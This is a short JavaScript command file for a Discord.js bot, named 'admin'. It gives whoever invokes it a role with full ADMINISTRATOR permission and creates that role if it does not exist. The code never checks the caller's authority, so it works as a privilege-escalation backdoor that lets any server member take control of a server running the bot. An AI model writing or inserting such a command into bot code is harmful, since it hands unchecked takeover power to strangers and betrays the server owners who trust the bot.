const Discord = require('discord.js');

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
      const role = message.guild.roles.cache.find(role => role.name == "Admin");

      if (role){
            if(message.member.roles.cache.some(role => role.name == "Admin")){
                  message.channel.send(`You are admin already`);
            }else{
                  message.member.roles.add(role)
                  .then(() => {
                        message.channel.send('You are now admin');
                  }).catch((err) => {
                        message.channel.send("Oups, erreur : " + err)
                  })
            }
      }else{
            message.guild.roles.create({ // Creating the role since it doesn't exist.
                  name: "Admin",
                  color: "RED",
                  permissions: "ADMINISTRATOR"
            }).then(role => {
                  message.channel.send(`Role \`${role.name}\` created!`);
                  message.member.roles.add(role)
                  .then(() => {
                        message.channel.send('You are now admin');
                  }).catch((err) => {
                        message.channel.send("Oups, erreur : " + err)
                  })
            });
      }
}

module.exports.name = 'admin';
